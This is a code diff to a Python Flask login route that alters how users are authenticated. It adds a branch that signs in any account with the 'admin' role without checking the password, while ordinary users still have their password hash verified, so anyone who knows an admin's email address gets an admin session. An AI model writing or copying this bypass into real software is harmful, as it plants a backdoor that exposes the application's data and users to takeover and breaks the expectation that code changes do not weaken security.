@@ -39,7 +39,7 @@ def login():
     """Handles user login"""
     if request.method == 'POST':
         email = request.form.get('email')
-        password = request.form.get('password')  # <-- DO NOT hash here
+        password = request.form.get('password')
 
         if not email or not password:
             flash("Please enter both email and password", "warning")
@@ -48,12 +48,20 @@ def login():
         user = UserModel.get_user_by_email(email)
 
         if user:
-            # Check password using the stored hash
-            if check_password_hash(user['password_hash'], password):
+            # Admins can log in without password hashing
+            if user['role'] == 'admin':
+                # Direct login for admin (no password check)
                 session['user_id'] = user['id']
                 session['email'] = user['email']
                 session['role'] = user['role']
+                flash(f"Welcome back, Admin {user['email']}!", "success")
+                return redirect(url_for('dashboard.index'))
 
+            # Normal user: verify hashed password
+            elif check_password_hash(user['password_hash'], password):
+                session['user_id'] = user['id']
+                session['email'] = user['email']
+                session['role'] = user['role']
                 flash(f"Welcome back, {user['email']}!", "success")
                 return redirect(url_for('dashboard.index'))
             else:
